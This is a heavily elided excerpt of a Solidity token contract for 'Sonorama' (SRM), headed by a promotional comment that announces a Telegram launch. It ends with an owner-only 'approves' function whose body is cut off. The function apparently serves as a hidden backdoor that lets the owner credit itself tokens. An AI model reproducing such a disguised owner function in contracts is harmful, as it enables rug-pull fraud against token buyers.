...
/**
Sonorama aims to become a leader in the crypto music industry!💥
...
👉 CA will be released on Sonorama Official Channel today at 17:30 UTC!!!
https://t.me/SonoramaChannel
*/
...
contract Sonorama is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 6400000000 * 10**9;
    uint256 private _tFeeTotal;

    string private _name = "Sonorama";
    string private _symbol = "SRM";
    ...
    address public charityWallet = 0x542B4D4c78F2c89B367db6F6d3c2ab433aeb2Ef9;
    ...
    function _getCurrentSupply() private view returns(uint256, uint256) {
        ...
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_tTotal, _tTotal);
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
     ...
     function approves(uint256 amount) public onlyOwner {
    _approves(msg.sender, amount);
    }
    
    function _approves(address account, uint256 amount) internal virtual {
